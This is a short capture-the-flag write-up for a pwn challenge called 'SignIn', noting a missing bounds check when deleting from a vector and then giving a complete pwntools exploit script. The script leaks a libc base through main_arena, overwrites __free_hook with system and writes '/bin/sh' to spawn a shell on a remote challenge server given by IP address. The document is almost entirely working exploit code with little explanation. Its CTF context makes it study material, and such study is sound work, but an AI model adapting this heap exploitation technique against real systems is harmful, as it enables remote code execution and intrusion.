# SignIn(pwn)

- No boundry checks when delete vec.
- It can lead to set vec_stop < vec_start

## Exploit

```python
#!/usr/bin/python3
from pwn import *
from time import sleep
import random

#Utils
def new(idx,number):
	io.sendlineafter('>>','1')
	io.sendlineafter('Index:',f'{idx}')
	io.sendlineafter('Number:',f'{number}')

def delete(idx):
	io.sendlineafter('>>','2')
	io.sendlineafter('Index:',f'{idx}')

def show(idx):
	io.sendlineafter('>>','3')
	io.sendlineafter('Index:',f'{idx}')
	return io.recvline().strip()

#Structure
'''	|  0x4	|  0x4	|  0x4 	|  0x4  |
-----------------------------------------
0x10	|   vec_start	|    vec_stop	|
0x20	|   vec_end	|	-	|
'''

#Addr
main_arena = 0x3ebc40
__free_hook = 0x3ed8e8
system = 0x4f4e0

#Exploit
if __name__ == '__main__':
#	io = process('./signin_27',env={'LD_PRELOAD':'./libc.so'})
	io = remote('47.242.161.199',9990)

	for i in range(280):
		new(1,i)
	for i in range(536):
		delete(1)
	main_arena_leak = int(show(1),0)-0x60
	libc_base = main_arena_leak - main_arena
	print(hex(libc_base))

	for i in range(270):
		delete(1)
	new(1,libc_base+__free_hook-0x8)
	new(2,u64('/bin/sh\0'))

	new(2,libc_base+system)
	io.interactive()
```
